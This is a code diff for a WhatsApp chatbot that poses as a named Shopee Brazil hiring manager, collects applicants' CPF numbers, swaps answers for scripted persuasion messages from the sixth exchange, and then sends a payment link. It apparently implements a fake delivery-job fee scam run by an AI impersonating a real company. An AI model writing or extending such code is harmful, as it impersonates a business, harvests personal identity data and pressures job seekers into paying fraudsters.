@@ -84,7 +84,7 @@ class ConversationAutomation:
         """Resposta inicial - apresentar como gerente da Shopee"""
         try:
             message = (
-                "Olá! Sou a gerente de entregadores da Shopee.\n\n"
+                "Olá! Sou Ana Rodrigues, Gerente de Contratação de Entregadores da Shopee Brasil.\n\n"
                 "Estou aqui para ajudar você a finalizar seu cadastro de Entregador da Shopee.\n\n"
                 "Para prosseguir, preciso validar seus dados.\n"
                 "Por favor, digite seu CPF (apenas números, sem pontos ou traços):"
@@ -726,16 +726,43 @@ class ConversationAutomation:
             if success:
                 self._save_outbound_message(conversation_id, f"🤖 IA: {ai_response}", result.get('messageId'))
                 
-                # Atualizar contador no banco
+                # Incrementar contador APENAS após envio bem-sucedido
+                conv_state.question_count += 1
                 self.db.session.commit()
                 
-                # Verificar se deve finalizar (após 5 perguntas OU se usuário demonstrou interesse)
-                if conv_state.question_count >= 5 or ShopeeDeliveryAssistant.should_finalize_payment([], conv_state.question_count):
+                # Verificar se deve finalizar (após 10 tentativas TOTAL OU se usuário demonstrou interesse)
+                # Buscar histórico recente para detecção de interesse
+                from models import ChatMessage
+                recent_messages = self.db.session.query(ChatMessage)\
+                    .filter_by(conversation_id=conversation_id, direction='inbound')\
+                    .order_by(ChatMessage.created_at.desc())\
+                    .limit(3).all()
+                conversation_history = [{"role": "user", "content": msg.content} for msg in reversed(recent_messages)]
+                
+                if conv_state.question_count >= 10 or ShopeeDeliveryAssistant.should_finalize_payment(conversation_history, conv_state.question_count):
                     # Dar uma pausa antes de enviar o link
                     import time
                     time.sleep(2)
                     
                     return self._send_pending_payment_link(conv_state, conversation_id, phone_number_id)
+                
+                # Entre as tentativas 6-10: usar mensagens de convencimento ao invés de responder perguntas
+                elif conv_state.question_count >= 5:
+                    # A partir da 6ª tentativa, usar mensagens pré-definidas de convencimento
+                    from openai_service import ShopeeDeliveryAssistant
+                    conversion_message = ShopeeDeliveryAssistant.get_conversion_message(conv_state.question_count)
+                    
+                    # Enviar mensagem de convencimento
+                    success, result = self.whatsapp_api.send_text_message(conv_state.phone_number, conversion_message)
+                    if success:
+                        # Incrementar contador APENAS após envio bem-sucedido
+                        conv_state.question_count += 1
+                        self.db.session.commit()
+                        
+                        self._save_outbound_message(conversation_id, f"🎯 Convencimento: {conversion_message}", result.get('messageId'))
+                        return True
+                    
+                    return False
                 
                 # Continuar no mesmo estado para mais perguntas
                 return True
